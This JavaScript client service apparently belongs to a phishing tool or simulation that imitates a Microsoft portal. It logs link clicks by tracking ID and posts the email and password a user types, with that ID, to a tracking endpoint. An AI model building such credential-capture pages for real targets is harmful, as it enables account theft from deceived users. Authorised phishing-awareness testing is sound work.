// client\src\services\MSPortalService.js
import { API_BASE_URL } from '../config/api';

export const logClick = async (trackingId) => {
    const apiUrl = `${API_BASE_URL}/api/tracking/click`;

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ trackingId }),
        });

        if (response.ok) {
            return { success: true };
        } else {
            const data = await response.json();
            return { success: false, message: data.message || 'Failed to log click' };
        }
    } catch (error) {
        return { success: false, message: 'An error occurred while logging click' };
    }
};

export const submitCredentials = async (email, password, trackingId) => {
    const apiUrl = `${API_BASE_URL}/api/tracking/submit`;

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email, password, trackingId }),
        });

        if (response.ok) {
            return { success: true };
        } else {
            const data = await response.json();
            return { success: false, message: data.message || 'Unable to Login' };
        }
    } catch (error) {
        return { success: false, message: 'An error occurred' };
    }
};


